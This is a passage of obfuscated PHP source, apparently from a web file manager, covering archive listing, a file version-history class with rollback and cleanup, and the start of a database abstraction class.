self::iconvSystem($±Òï¸¼); if ($¸Şé•©Œ >= 0) { $îã‰˜¶È = isset($Èåêâ”—[$ÓÏ³’§[1183]]) ? $Èåêâ”—[$ÓÏ³’§[1183]] : !1; $ÑÏİÚ¯¤ = isset($Èåêâ”—[$ÓÏ³’§[32]]) ? $Èåêâ”—[$ÓÏ³’§[32]] : $ÓÏ³’§[12]; KodArchive::filePreview($±Òï¸¼, $¸Şé•©Œ, $îã‰˜¶È, $ÑÏİÚ¯¤); self::archiveExt(); die; } $Ëû¤¬Ä = KodArchive::listContent($±Òï¸¼); self::archiveExt(); del_dir($—Ô”¥´—); if (!$Ëû¤¬Ä[$ÓÏ³’§[1175]]) { show_json($Ëû¤¬Ä[$ÓÏ³’§[1177]], !1); } $ŠŠÜàšİ = json_encode($Ëû¤¬Ä[$ÓÏ³’§[1177]]); self::setContent($ĞÀ°£õ…, $ŠŠÜàšİ); if (count($Ëû¤¬Ä[$ÓÏ³’§[1177]]) >= $åõğº¼à) { show_json(sprintf(LNG($ÓÏ³’§[1181]), count($Ëû¤¬Ä[$ÓÏ³’§[1177]])), !1); } return $Ëû¤¬Ä[$ÓÏ³’§[1177]]; } private static function fileExt($Ìğ‚í) { $‚àØ…š =& $_SERVER[¥Ÿ©ÒèÌ]; $¯óŒÖãŒ = $Ìğ‚í[$‚àØ…š[167]]; if ($¯óŒÖãŒ == $‚àØ…š[1184]) { $ÒŞßğŸš = $‚àØ…š[1185]; if (substr($Ìğ‚í[$‚àØ…š[32]], -strlen($ÒŞßğŸš)) == $ÒŞßğŸš) { $¯óŒÖãŒ = $‚àØ…š[1186]; } } self::archiveExt($¯óŒÖãŒ); return $¯óŒÖãŒ; } private static function zipFileList($à·ÔÔÇ, $›÷øª•Ä = false) { $¹×¾Ü’¯ =& $_SERVER[¥Ÿ©ÒèÌ]; $ñÓ„Ù¹ = array(); foreach ($à·ÔÔÇ as $‡£ß’İ) { $ êïœÈ• = $‡£ß’İ[$¹×¾Ü’¯[78]]; if ($›÷øª•Ä) { $ êïœÈ• = self::copy($‡£ß’İ[$¹×¾Ü’¯[78]], $›÷øª•Ä, $¹×¾Ü’¯[808]); } else { $›–øçÅ­ = self::init($‡£ß’İ[$¹×¾Ü’¯[78]]); if ($›–øçÅ­->getType() == $¹×¾Ü’¯[107]) { $ êïœÈ• = $›–øçÅ­->path; } } if ($ êïœÈ• && self::local()->exist($ êïœÈ•)) { $ñÓ„Ù¹[$‡£ß’İ[$¹×¾Ü’¯[78]]] = $ êïœÈ•; } } if (!empty($ñÓ„Ù¹)) { return array_values($ñÓ„Ù¹); } show_json(LNG($¹×¾Ü’¯[1150]), !1); } public static function tmpFileName($ææÚƒÂ) { $¾Éƒïã¥ =& $_SERVER[¥Ÿ©ÒèÌ]; $å™¶İœ = array($ææÚƒÂ[$¾Éƒïã¥[32]], $ææÚƒÂ[$¾Éƒïã¥[78]], $ææÚƒÂ[$¾Éƒïã¥[80]], $ææÚƒÂ[$¾Éƒïã¥[521]]); return md5(implode($¾Éƒïã¥[11], $å™¶İœ)); } private static function localFilePath($„ôÈÜ­, $Õ¾Êœª’) { $šÓ¢ÀŠ =& $_SERVER[¥Ÿ©ÒèÌ]; if ($Õ¾Êœª’ == $šÓ¢ÀŠ[1187] && strtoupper(substr(PHP_OS, 0, 3)) == $šÓ¢ÀŠ[1188]) { return !1; } $¾¾°À¡ş = KodIO::parse($„ôÈÜ­); if ($¾¾°À¡ş[$šÓ¢ÀŠ[33]] == KodIO::KOD_SOURCE) { $ÇÀØªæ› = Model($šÓ¢ÀŠ[815])->fileInfoGet(KodIO::sourceID($„ôÈÜ­)); if (!$ÇÀØªæ›[$šÓ¢ÀŠ[78]]) { show_json($šÓ¢ÀŠ[1189], !1); } $„ôÈÜ­ = $ÇÀØªæ›[$šÓ¢ÀŠ[78]]; } $Üí©ùœÇ = self::init($„ôÈÜ­); if ($Üí©ùœÇ->pathParse[$šÓ¢ÀŠ[1137]]) { $„ôÈÜ­ = $Üí©ùœÇ->pathParse[$šÓ¢ÀŠ[1137]]; $Üí©ùœÇ = self::init($„ôÈÜ­); } $Ş‚×ø• = $Üí©ùœÇ->getType(); if ($Ş‚×ø• == $šÓ¢ÀŠ[107] || $Ş‚×ø• == $šÓ¢ÀŠ[1190]) { if (!$Üí©ùœÇ->exist($Üí©ùœÇ->path)) { show_json(LNG($šÓ¢ÀŠ[106]), !1); } return $Üí©ùœÇ->path; } return !1; } private static function archiveExt($â·©ÃÓÒ = '') { $GLOBALS[$_SERVER[¥Ÿ©ÒèÌ][1191]] = $â·©ÃÓÒ; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $­ØÖæÎ¦ =& $_SERVER[¥Ÿ©ÒèÌ]; $×­òÆÒ = $GLOBALS[$­ØÖæÎ¦[6]][$­ØÖæÎ¦[90]]; if ($×­òÆÒ[$­ØÖæÎ¦[1192]] != 1) { return; } if ($×­òÆÒ[$­ØÖæÎ¦[1193]] <= 0) { return; } if (isset($_REQUEST[$­ØÖæÎ¦[1194]]) && $_REQUEST[$­ØÖæÎ¦[1194]] == $­ØÖæÎ¦[89]) { return; } Hook::bind($­ØÖæÎ¦[1195], $­ØÖæÎ¦[1196]); Hook::bind($­ØÖæÎ¦[1197], $­ØÖæÎ¦[1198]); Hook::bind($­ØÖæÎ¦[1199], $­ØÖæÎ¦[1200]); Hook::bind($­ØÖæÎ¦[1201], $­ØÖæÎ¦[1202]); Hook::bind($­ØÖæÎ¦[1203], $­ØÖæÎ¦[1204]); Hook::bind($­ØÖæÎ¦[1205], $­ØÖæÎ¦[1206]); } public static function eventBeforeUpload($æïÄàø‚) { if ($æïÄàø‚[3] && $æïÄàø‚[3] != REPEAT_REPLACE) { return; } $¸¥º³Äö = self::parsePath($æïÄàø‚[0]); if (!$¸¥º³Äö) { return; } self::add($¸¥º³Äö); } public static function eventBeforeEdit($‹·³‰Ÿ³) { $ÉèÒ‘‡ = self::parsePath($‹·³‰Ÿ³[0]); if (!$ÉèÒ‘‡) { return; } self::add($ÉèÒ‘‡); } public static function eventBeforeCopyFile($¬äØËìƒ, $£¶«»àì, $À™æ÷Úç, $ãÃŸ×Ò, $š¸ëï½», $”œÅ™Ìñ) { $­ÄÍ¦£¦ = $À™æ÷Úç->getPathOuter($ãÃŸ×Ò); $¤İ¬©•° = self::parsePath($­ÄÍ¦£¦); if (!$¤İ¬©•°) { return; } self::add($¤İ¬©•°); } public static function eventBeforeRename($“İŸ÷) { $Åˆ¢Æ³ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÇíĞ¸ = self::parsePath($“İŸ÷[0]); if (!$ÇíĞ¸) { return; } $ı©ñÆœ = self::checkInHistory($ÇíĞ¸); if (!$ı©ñÆœ) { return; } if ($ı©ñÆœ[$Åˆ¢Æ³[33]] == $Åˆ¢Æ³[192]) { $œ½‰§Ì = self::listData($ÇíĞ¸); if ($œ½‰§Ì && $œ½‰§Ì[$Åˆ¢Æ³[373]]) { self::moveHistory($ÇíĞ¸, $“İŸ÷[1]); } } else { IO::rename($ı©ñÆœ[$Åˆ¢Æ³[78]], $“İŸ÷[1]); } } public static function eventBeforeMove($œø–çúÏ) { $ªêì£·Ñ =& $_SERVER[¥Ÿ©ÒèÌ]; $Å‹€›ª¡ = self::parsePath($œø–çúÏ[0]); if (!$Å‹€›ª¡) { return; } $Í®ç© = self::parsePath($œø–çúÏ[1]); if (!$Í®ç©) { return; } $í÷åï = $œø–çúÏ[3]; $Ïß‚ùÁ = self::checkInHistory($Å‹€›ª¡); if (!$Ïß‚ùÁ) { return; } $²ó°¡ìù = self::pathHistory($Í®ç©); if ($Ïß‚ùÁ[$ªêì£·Ñ[33]] == $ªêì£·Ñ[192]) { $ïûÅš«Ğ = self::listData($Å‹€›ª¡); $ç½›×Ğ = rtrim($Í®ç©, $ªêì£·Ñ[8]) . $ªêì£·Ñ[8] . ($í÷åï ? $í÷åï : get_path_this($Å‹€›ª¡)); $„ÄÜø¼¢ = self::listData($ç½›×Ğ); if ($ïûÅš«Ğ && $ïûÅš«Ğ[$ªêì£·Ñ[373]] && $„ÄÜø¼¢ && $„ÄÜø¼¢[$ªêì£·Ñ[373]]) { return self::clear($Å‹€›ª¡); } if ($ïûÅš«Ğ && $ïûÅš«Ğ[$ªêì£·Ñ[373]]) { self::moveHistory($Å‹€›ª¡, $í÷åï, $²ó°¡ìù); } } else { IO::move($Ïß‚ùÁ[$ªêì£·Ñ[78]], $²ó°¡ìù, !1, $í÷åï); self::clearEmptyFolder(IO::pathFather($Ïß‚ùÁ[$ªêì£·Ñ[78]])); } } public static function eventAfterRemove($‘ÈÅ“™³, $­ï‚Ğ‹–) { $ğÚŠ¿÷¥ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$­ï‚Ğ‹–) { return; } $Ø¤·±ó = self::parsePath($‘ÈÅ“™³[0]); if (!$Ø¤·±ó) { return; } $˜Ãê‹ÆÈ = self::checkInHistory($Ø¤·±ó); if (!$˜Ãê‹ÆÈ) { return; } if ($˜Ãê‹ÆÈ[$ğÚŠ¿÷¥[33]] == $ğÚŠ¿÷¥[192]) { $™®œÈã = self::listData($Ø¤·±ó, !1); if ($™®œÈã && $™®œÈã[$ğÚŠ¿÷¥[373]]) { self::clear($Ø¤·±ó, !1); } } else { IO::remove($˜Ãê‹ÆÈ[$ğÚŠ¿÷¥[78]]); self::clearEmptyFolder(IO::pathFather($˜Ãê‹ÆÈ[$ğÚŠ¿÷¥[78]])); } } private static function checkInHistory($ÒßÈ„²€) { $ğˆÖç…± = self::pathHistory($ÒßÈ„²€); if (!IO::exist($ğˆÖç…±)) { $ğˆÖç…± .= $_SERVER[¥Ÿ©ÒèÌ][1207]; } return IO::exist($ğˆÖç…±) ? IO::info($ğˆÖç…±) : !1; } private static function parsePath($ï€××èâ) { $¦ˆì³¯‡ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$ï€××èâ) { return !1; } if ($GLOBALS[$¦ˆì³¯‡[1208]]) { return; } $Êî»ğô = KodIO::parse($ï€××èâ); $ü¢åàø¬ = $Êî»ğô[$¦ˆì³¯‡[33]]; $ñÑ²ªïü = !$ü¢åàø¬ || $ü¢åàø¬ == KodIO::KOD_IO || $ü¢åàø¬ == KodIO::KOD_SHARE_ITEM; if (!$ñÑ²ªïü || !$Êî»ğô[$¦ˆì³¯‡[1209]]) { return !1; } if (substr($ï€××èâ, 0, strlen(DATA_PATH . $¦ˆì³¯‡[1210])) == DATA_PATH . $¦ˆì³¯‡[1210]) { return !1; } if ($ü¢åàø¬ == KodIO::KOD_SHARE_ITEM) { $ïğ©¿å = IO::init($ï€××èâ); if ($ïğ©¿å->pathParse[$¦ˆì³¯‡[1137]]) { return self::parsePath($ïğ©¿å->pathParse[$¦ˆì³¯‡[1137]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $‡£ãš¢§ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $¦ˆì³¯‡[1211]); foreach ($‡£ãš¢§ as $½áôÃïş) { if (!$ü¢åàø¬ && substr($ï€××èâ, 0, strlen($½áôÃïş)) == $½áôÃïş) { return !1; } } self::log($GLOBALS[$¦ˆì³¯‡[1132]] . $¦ˆì³¯‡[1212] . $ï€××èâ); return $ï€××èâ; } private static function pathHistory($Œú‡ÎÏã) { $¨ş¬±½ª =& $_SERVER[¥Ÿ©ÒèÌ]; $‹ËÌÁ¥ = self::$_historyBase . ltrim(KodIO::clear($Œú‡ÎÏã), $¨ş¬±½ª[8]); $‹ËÌÁ¥ = str_replace(array($¨ş¬±½ª[1213]), array($¨ş¬±½ª[1214]), $‹ËÌÁ¥); return $‹ËÌÁ¥; } public static function log($áò–) { } public static function historyCount($ï¹²…¸Õ) { $›Ÿ˜ÊëÈ =& $_SERVER[¥Ÿ©ÒèÌ]; $§¦·…ü  = array(); $…„§´²ó = array(); foreach ($ï¹²…¸Õ as $à¦¡ÅÁÌ) { $Ú’ÁİéÛ = get_path_father($à¦¡ÅÁÌ); if (!$…„§´²ó[$Ú’ÁİéÛ]) { $…„§´²ó[$Ú’ÁİéÛ] = array(); } $…„§´²ó[$Ú’ÁİéÛ][] = get_path_this($à¦¡ÅÁÌ); } foreach ($…„§´²ó as $Ú’ÁİéÛ => $ä£ëˆÊà) { $ìàÇÈ€¶ = self::parsePath($Ú’ÁİéÛ); if (!$ìàÇÈ€¶) { continue; } foreach ($ä£ëˆÊà as $©‰«·§¶) { $ÂÓö¿ƒø = self::listData(rtrim($ìàÇÈ€¶, $›Ÿ˜ÊëÈ[8]) . $›Ÿ˜ÊëÈ[8] . $©‰«·§¶, !1); if ($ÂÓö¿ƒø && $ÂÓö¿ƒø[$›Ÿ˜ÊëÈ[373]]) { $§¦·…ü [rtrim($Ú’ÁİéÛ, $›Ÿ˜ÊëÈ[8]) . $›Ÿ˜ÊëÈ[8] . $©‰«·§¶] = count($ÂÓö¿ƒø[$›Ÿ˜ÊëÈ[373]]); } } } return $§¦·…ü ; } public static function add($¬¯—¶šé) { $†šåª¤” =& $_SERVER[¥Ÿ©ÒèÌ]; $Ëè”ÖÉÌ = self::listData($¬¯—¶šé); if (!$Ëè”ÖÉÌ) { return; } $„Û–Ğ = Model($†šåª¤”[760])->get($†šåª¤”[1215]); $Ï’éÅÓ = $GLOBALS[$†šåª¤”[6]][$†šåª¤”[90]][$†šåª¤”[1193]]; $·†Şé¦ = $„Û–Ğ == $†šåª¤”[1216] ? 5 : $Ï’éÅÓ; if ($Ï’éÅÓ <= 0) { return; } $¿¾ÎÉĞ = IO::hashSimple($¬¯—¶šé); $š‡äÈÄ€ = IO::info($¬¯—¶šé); $Ä»Ë™¤ = $Ëè”ÖÉÌ[$†šåª¤”[373]]; if ($š‡äÈÄ€[$†šåª¤”[80]] == 0) { return; } if ($š‡äÈÄ€[$†šåª¤”[80]] >= 1024 * 1024 * 500) { return !1; } if ($Ä»Ë™¤ && $Ä»Ë™¤[0][$†šåª¤”[170]] == $¿¾ÎÉĞ) { return !0; } if (array_key_exists($†šåª¤”[195], $š‡äÈÄ€) && !$š‡äÈÄ€[$†šåª¤”[195]]) { return !1; } $áóë«”û = short_id(time()); $¿¾Î€•¤ = array($†šåª¤”[401] => $áóë«”û, $†šåª¤”[170] => $¿¾ÎÉĞ, $†šåª¤”[32] => $š‡äÈÄ€[$†šåª¤”[32]] . $†šåª¤”[10] . date($†šåª¤”[1217]) . rand_string(1), $†šåª¤”[80] => $š‡äÈÄ€[$†šåª¤”[80]], $†šåª¤”[452] => USER_ID, $†šåª¤”[193] => time(), $†šåª¤”[1218] => $†šåª¤”[12]); IO::mkdir($Ëè”ÖÉÌ[$†šåª¤”[1219]]); $™š’ğ ¾ = IO::copy($¬¯—¶šé, $Ëè”ÖÉÌ[$†šåª¤”[1219]], !1, $¿¾Î€•¤[$†šåª¤”[32]]); if (!$™š’ğ ¾) { self::clearEmptyFolder($Ëè”ÖÉÌ[$†šåª¤”[1219]]); return !1; } array_unshift($Ä»Ë™¤, $¿¾Î€•¤); if (count($Ä»Ë™¤) > $·†Şé¦) { $†®»Á¤³ = array_slice($Ä»Ë™¤, $·†Şé¦); foreach ($†®»Á¤³ as $ûË¯îá) { IO::remove($Ëè”ÖÉÌ[$†šåª¤”[1219]] . $ûË¯îá[$†šåª¤”[32]]); } $Ä»Ë™¤ = array_slice($Ä»Ë™¤, 0, $·†Şé¦); } return self::saveData($Ëè”ÖÉÌ[$†šåª¤”[1220]], $Ä»Ë™¤); } public static function remove($±ğ¿ö¹, $¹Ğíïãá) { $Ü±š®³× =& $_SERVER[¥Ÿ©ÒèÌ]; $ÕìÜìÈ = self::listData($±ğ¿ö¹); $ã‰ı–¦ = array(); if (!$ÕìÜìÈ) { return !1; } foreach ($ÕìÜìÈ[$Ü±š®³×[373]] as $ÊíÚ‚ù¸) { if ($ÊíÚ‚ù¸[$Ü±š®³×[401]] == $¹Ğíïãá) { IO::remove($ÕìÜìÈ[$Ü±š®³×[1219]] . $ÊíÚ‚ù¸[$Ü±š®³×[32]]); continue; } $ã‰ı–¦[] = $ÊíÚ‚ù¸; } return self::saveData($ÕìÜìÈ[$Ü±š®³×[1220]], $ã‰ı–¦); } public static function clear($ˆ¦¦²ï, $É‰ÓÄú÷ = true) { $«½è‡ŒØ =& $_SERVER[¥Ÿ©ÒèÌ]; $Òˆ„”êË = self::listData($ˆ¦¦²ï, $É‰ÓÄú÷); if (!$Òˆ„”êË) { return !1; } foreach ($Òˆ„”êË[$«½è‡ŒØ[373]] as $À¹ˆŞ¡) { IO::remove($Òˆ„”êË[$«½è‡ŒØ[1219]] . $À¹ˆŞ¡[$«½è‡ŒØ[32]]); } return self::saveData($Òˆ„”êË[$«½è‡ŒØ[1220]], array()); } public static function moveHistory($ÍÁ±ç¥¤, $Šº¸§ë° = '', $—èÏù æ = '') { $õç†¾» =& $_SERVER[¥Ÿ©ÒèÌ]; $ö‚½¤ó = self::listData($ÍÁ±ç¥¤, !1); if (!$ö‚½¤ó || !$ö‚½¤ó[$õç†¾»[373]]) { return !1; } $ÅÀ°õĞ× = $õç†¾»[1207]; $Šº¸§ë° = $Šº¸§ë° ? $Šº¸§ë° : get_path_this($ÍÁ±ç¥¤); $—èÏù æ = $—èÏù æ ? $—èÏù æ : $ö‚½¤ó[$õç†¾»[1219]]; $å—ÃüÎã = substr(get_path_this($ö‚½¤ó[$õç†¾»[1220]]), 0, -strlen($ÅÀ°õĞ×)); foreach ($ö‚½¤ó[$õç†¾»[373]] as $ß—ÉÅÓ© => $ƒÓ úØ¼) { $—Ñ¡”¬Å = $Šº¸§ë° . substr($ƒÓ úØ¼[$õç†¾»[32]], strlen($å—ÃüÎã)); $×Ï¼õíÏ = IO::move($ö‚½¤ó[$õç†¾»[1219]] . $ƒÓ úØ¼[$õç†¾»[32]], $—èÏù æ, !1, $—Ñ¡”¬Å); if ($×Ï¼õíÏ) { $ö‚½¤ó[$õç†¾»[373]][$ß—ÉÅÓ©][$õç†¾»[32]] = $—Ñ¡”¬Å; } } $ö‚½¤ó[$õç†¾»[1220]] = IO::move($ö‚½¤ó[$õç†¾»[1220]], $—èÏù æ, !1, $Šº¸§ë° . $ÅÀ°õĞ×); self::saveData($ö‚½¤ó[$õç†¾»[1220]], $ö‚½¤ó[$õç†¾»[373]]); self::clearEmptyFolder($ö‚½¤ó[$õç†¾»[1219]]); } public static function rollback($ÎÖÃÁÍ†, $˜‘ÓÚ ¨) { $àô®œà¬ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÄŠµ­Æ¤ = self::listData($ÎÖÃÁÍ†); if (!$ÄŠµ­Æ¤) { return; } $›„ì£¬Ÿ = IO::info($ÎÖÃÁÍ†); foreach ($ÄŠµ­Æ¤[$àô®œà¬[373]] as $œùÌˆ¹ƒ => $§£Ì¡õĞ) { if ($§£Ì¡õĞ[$àô®œà¬[401]] == $˜‘ÓÚ ¨) { self::add($ÎÖÃÁÍ†); $™”Ûø¦ë = $ÄŠµ­Æ¤[$àô®œà¬[1219]] . $§£Ì¡õĞ[$àô®œà¬[32]]; $ë¹¦·´Í = IO::copy($™”Ûø¦ë, IO::pathFather($ÎÖÃÁÍ†), REPEAT_REPLACE, $›„ì£¬Ÿ[$àô®œà¬[32]]); if ($ë¹¦·´Í) { self::remove($ÎÖÃÁÍ†, $˜‘ÓÚ ¨); } return $ë¹¦·´Í; } } return !1; } public static function setDetail($Ííà –©, $–ÉËÁ±è, $¿¤İ”­) { $µ‘˜½ºü =& $_SERVER[¥Ÿ©ÒèÌ]; $”ÎŞ¡£• = self::listData($Ííà –©); if (!$”ÎŞ¡£•) { return; } foreach ($”ÎŞ¡£•[$µ‘˜½ºü[373]] as $ÖÄ½£ÀÇ => $ë®şŒ©Õ) { if ($ë®şŒ©Õ[$µ‘˜½ºü[401]] == $–ÉËÁ±è) { $”ÎŞ¡£•[$µ‘˜½ºü[373]][$ÖÄ½£ÀÇ][$µ‘˜½ºü[1218]] = $¿¤İ”­; self::saveData($”ÎŞ¡£•[$µ‘˜½ºü[1220]], $”ÎŞ¡£•[$µ‘˜½ºü[373]]); return !0; } } return !1; } public static function fileInfo($¡ì¡Ï€¸, $éğ½·ôÔ) { $×â–¼­§ =& $_SERVER[¥Ÿ©ÒèÌ]; $á¨ıçº = self::listData($¡ì¡Ï€¸); if (!$á¨ıçº) { show_json(LNG($×â–¼­§[106]), !1); } $œ¯ªÖÀ = $×â–¼­§[12]; foreach ($á¨ıçº[$×â–¼­§[373]] as $Ë¡ØêÎ¹ => $ÛÊ¡ä·Ù) { if ($ÛÊ¡ä·Ù[$×â–¼­§[401]] != $éğ½·ôÔ) { continue; } $œ¯ªÖÀ = $á¨ıçº[$×â–¼­§[1219]] . $ÛÊ¡ä·Ù[$×â–¼­§[32]]; break; } if (!$œ¯ªÖÀ) { show_json(LNG($×â–¼­§[106]), !1); } return IO::info($œ¯ªÖÀ); } public static function fileOut($¥ä³Ùö, $ñÈ»à“É, $‡®Ë¹™¡ = false) { $†»úóÙ» =& $_SERVER[¥Ÿ©ÒèÌ]; $£¶Ÿ±‘ = self::fileInfo($¥ä³Ùö, $ñÈ»à“É); $Ì¯°–Šá =& $GLOBALS[$†»úóÙ»[7]]; $‡®Ë¹™¡ = isset($Ì¯°–Šá[$†»úóÙ»[1183]]) && $Ì¯°–Šá[$†»úóÙ»[1183]] == 1; if (isset($Ì¯°–Šá[$†»úóÙ»[33]]) && $Ì¯°–Šá[$†»úóÙ»[33]] == $†»úóÙ»[1221]) { return IO::fileOutImage($£¶Ÿ±‘[$†»úóÙ»[78]], $Ì¯°–Šá[$†»úóÙ»[1222]]); } IO::fileOut($£¶Ÿ±‘[$†»úóÙ»[78]], $‡®Ë¹™¡, get_path_this($¥ä³Ùö)); } public static function listData($’—µòüÍ, $øƒŠ Ô· = true) { $‹àı’±¯ =& $_SERVER[¥Ÿ©ÒèÌ]; if ($øƒŠ Ô· && !IO::exist($’—µòüÍ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($’—µòüÍ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $¡ß•èùŒ = self::pathHistory($’—µòüÍ); $Ğ©ˆÍ… = array($‹àı’±¯[1220] => $¡ß•èùŒ . $‹àı’±¯[1207], $‹àı’±¯[1219] => rtrim(get_path_father($¡ß•èùŒ), $‹àı’±¯[8]) . $‹àı’±¯[8], $‹àı’±¯[373] => array()); $ÃÄµ”’ = IO::getContent($Ğ©ˆÍ…[$‹àı’±¯[1220]]); if ($ÃÄµ”’) { $¦¢Üœ…ª = json_decode($ÃÄµ”’, !0); if (is_array($¦¢Üœ…ª)) { $Ğ©ˆÍ…[$‹àı’±¯[373]] = $¦¢Üœ…ª; } } return $Ğ©ˆÍ…; } private static function saveData($ó“Ş™ìİ, $ƒã¨éÍ­) { $™¼Úçƒ =& $_SERVER[¥Ÿ©ÒèÌ]; self::log($™¼Úçƒ[1223] . $ó“Ş™ìİ . $™¼Úçƒ[71] . count($ƒã¨éÍ­), $™¼Úçƒ[742]); if ($ƒã¨éÍ­) { return IO::setContent($ó“Ş™ìİ, json_encode($ƒã¨éÍ­)); } $ŸÍİØô“ = IO::pathFather($ó“Ş™ìİ); IO::remove($ó“Ş™ìİ); self::clearEmptyFolder($ŸÍİØô“); return !0; } public static function clearEmptyFolder($°ûà„ĞÇ) { $Şå™Íå =& $_SERVER[¥Ÿ©ÒèÌ]; if (trim($°ûà„ĞÇ, $Şå™Íå[8]) == trim(self::$_historyBase, $Şå™Íå[8])) { return; } $¥•ˆÁìƒ = IO::pathFather($°ûà„ĞÇ); $£–äà»˜ = IO::has($°ûà„ĞÇ, !0); if ($£–äà»˜[$Şå™Íå[202]] > 0 || $£–äà»˜[$Şå™Íå[203]] > 0) { return; } IO::remove($°ûà„ĞÇ); self::clearEmptyFolder($¥•ˆÁìƒ); } private static function getBasePath() { $˜ûáÛ·Í =& $_SERVER[¥Ÿ©ÒèÌ]; $‚ñü”¢é = Model($˜ûáÛ·Í[1224])->get($˜ûáÛ·Í[1225]); if ($‚ñü”¢é) { if (!IO::exist($‚ñü”¢é)) { IO::mkdir($‚ñü”¢é); } if (get_path_this($‚ñü”¢é) == $˜ûáÛ·Í[1210]) { $Ö£ğ¥ê¾ = $˜ûáÛ·Í[1226] . rand_string(8); @rename($‚ñü”¢é, get_path_father($‚ñü”¢é) . $˜ûáÛ·Í[8] . $Ö£ğ¥ê¾); $‚ñü”¢é = DATA_PATH . $Ö£ğ¥ê¾ . $˜ûáÛ·Í[8]; file_put_contents(DATA_PATH . $˜ûáÛ·Í[1227], $˜ûáÛ·Í[12]); Model($˜ûáÛ·Í[1224])->set($˜ûáÛ·Í[1225], $‚ñü”¢é); } return $‚ñü”¢é; } $‚ñü”¢é = DATA_PATH . $˜ûáÛ·Í[1226] . rand_string(8) . $˜ûáÛ·Í[8]; $‚ñü”¢é = IO::mkdir($‚ñü”¢é); $‚ñü”¢é = rtrim($‚ñü”¢é, $˜ûáÛ·Í[8]) . $˜ûáÛ·Í[8]; file_put_contents($‚ñü”¢é . $˜ûáÛ·Í[1227], $˜ûáÛ·Í[12]); file_put_contents(DATA_PATH . $˜ûáÛ·Í[1227], $˜ûáÛ·Í[12]); Model($˜ûáÛ·Í[1224])->set($˜ûáÛ·Í[1225], $‚ñü”¢é); return $‚ñü”¢é; } } goto Bºõ¾ùíÏˆ; a£›ßŞœ“·: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\x68\151\x6e\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\x3d", "\156\x65\161" => "\x3c\76", "\x67\x74" => "\x3e", "\145\x67\164" => "\76\75", "\x6c\x74" => "\x3c", "\x65\x6c\164" => "\74\x3d", "\156\x6f\164\x6c\151\x6b\145" => "\x4e\117\124\40\x4c\111\x4b\x45", "\154\151\x6b\x65" => "\x4c\111\x4b\105", "\151\156" => "\x49\116", "\x6e\157\164\x69\x6e" => "\x4e\117\124\40\111\x4e", "\x6e\157\164\x20\x69\x6e" => "\x4e\117\x54\40\111\116", "\x62\x65\164\167\145\x65\x6e" => "\x42\x45\124\127\105\x45\116", "\x6e\157\164\x62\x65\x74\167\x65\145\156" => "\116\x4f\x54\40\x42\x45\x54\x57\x45\x45\116", "\156\x6f\x74\40\x62\x65\164\x77\x65\x65\156" => "\x4e\x4f\x54\40\x42\105\x54\127\105\x45\x4e"); protected $selectSql = "\123\105\x4c\105\103\x54\x25\104\x49\x53\124\111\x4e\103\124\45\40\45\x46\x49\105\x4c\x44\x25\x20\106\x52\x4f\x4d\40\x25\124\101\102\x4c\105\45\45\x4a\117\x49\x4e\45\x25\x57\x48\105\122\x45\x25\45\107\122\x4f\125\x50\x25\45\110\101\x56\111\x4e\107\45\45\x4f\122\104\105\122\x25\45\114\111\x4d\x49\x54\45\40\x25\125\x4e\x49\117\116\x25\x25\103\117\x4d\115\x45\116\124\45"; protected $bind = array(); public static function getInstance() { $–®àÚ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¥Ÿ©ÒèÌ][946], $–®àÚ); } public function factory($õÈ‘¼ËØ = '') { $»ñçÍ×Ğ =& $_SERVER[¥Ÿ©ÒèÌ]; $õÈ‘¼ËØ = $this->parseConfig($õÈ‘¼ËØ); if (empty($õÈ‘¼ËØ[$»ñçÍ×Ğ[947]])) { think_exception(think_lang($»ñçÍ×Ğ[948])); } $this->dbType = ucwords(strtolower($õÈ‘¼ËØ[$»ñçÍ×Ğ[947]])); $ƒ®·¨ˆÏ = $»ñçÍ×Ğ[949] . $this->dbType; if (class_exists($ƒ®·¨ˆÏ)) { $Ö¼‰¿›– = new $ƒ®·¨ˆÏ($õÈ‘¼ËØ); if ($»ñçÍ×Ğ[950] != strtolower($õÈ‘¼ËØ[$»ñçÍ×Ğ[947]])) { $Ö¼‰¿›–->dbType = strtoupper($this->dbType); } else { $Ö¼‰¿›–->dbType = $this->_getDsnType($õÈ‘¼ËØ[$»ñçÍ×Ğ[902]]); } } else { think_exception(think_lang($»ñçÍ×Ğ[951]) . $»ñçÍ×Ğ[952] . $ƒ®·¨ˆÏ); } return $Ö¼‰¿›–; } public function __call($¶ÁìË½Ë, $Èİ„ş›¦) { if (method_exists($this, $¶ÁìË½Ë)) { return call_user_func_array(array($this, $¶ÁìË½Ë), $Èİ„ş›¦); } } protected function _getDsnType($¿‚ÊÜòœ) { $°Ç×Å˜ = explode($_SERVER[¥Ÿ©ÒèÌ][4], $¿‚ÊÜòœ); $ñ‹Í·ŒÎ = strtoupper(trim($°Ç×Å˜[0])); return $ñ‹Í·ŒÎ; } private function parseConfig($½Å»ƒ«ş = '') { $­‚©ä£ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!empty($½Å»ƒ«ş) && is_string($½Å»ƒ«ş)) { $½Å»ƒ«ş = $this->parseDSN($½Å»ƒ«ş); } elseif (is_array($½Å»ƒ«ş)) { $½Å»ƒ«ş = array_change_key_case($½Å»ƒ«ş); $½Å»ƒ«ş = array($­‚©ä£[947] => $½Å»ƒ«ş[$­‚©ä£[953]], $­‚©ä£[874] => $½Å»ƒ«ş[$­‚©ä£[954]], $­‚©ä£[875] => $½Å»ƒ«ş[$­‚©ä£[955]], $­‚©ä£[872] => $½Å»ƒ«ş[$­‚©ä£[956]], $­‚©ä£[873] => $½Å»ƒ«ş[$­‚©ä£[957]], $­‚©ä£[21] => 